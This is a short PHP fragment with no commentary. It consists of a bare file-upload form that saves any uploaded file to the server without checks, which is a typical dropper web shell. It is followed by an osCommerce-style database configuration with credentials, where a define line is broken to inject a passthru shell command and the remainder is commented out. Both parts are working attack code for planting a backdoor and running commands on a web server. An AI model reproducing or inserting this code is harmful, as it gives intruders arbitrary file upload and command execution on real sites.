<?php echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>'; if( $_POST['_upl'] == "Upload" ) { if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<b>Upload Done.<b><br><br>'; }else { echo '<b>Upload Failed.</b><br><br>'; }}?>

define('DB_SERVER', 'localhost');
  define('DB_SERVER_USERNAME', 'jack');
  define('DB_SERVER_PASSWORD', 'yellow');
  define('DB_DATABASE', 'c3VzYW46c2hhZG93_catalog');passthru('ls -la');/*');